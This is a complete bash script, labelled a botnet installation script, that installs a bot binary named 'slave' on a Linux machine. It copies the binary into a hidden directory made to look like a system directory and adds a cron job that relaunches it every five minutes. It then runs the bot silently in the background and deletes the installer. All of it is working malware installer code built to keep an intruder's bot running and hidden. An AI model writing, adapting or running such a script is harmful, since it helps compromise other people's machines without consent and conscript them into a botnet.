#!/bin/bash
# Botnet Installation Script

# Get the current user
USER=$(whoami)

# Create a hidden directory in /tmp
mkdir -p /tmp/.systemd

# Copy the bot binary to the hidden location
cp "$0" /tmp/.systemd/slave 2>/dev/null || cp slave-linux /tmp/.systemd/slave

# Make it executable
chmod +x /tmp/.systemd/slave

# Add to crontab for persistence (runs every 5 minutes)
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.systemd/slave") | crontab -

# Execute in background
nohup /tmp/.systemd/slave > /dev/null 2>&1 &

# Clean up
rm -f "$0" 2>/dev/null

exit 0
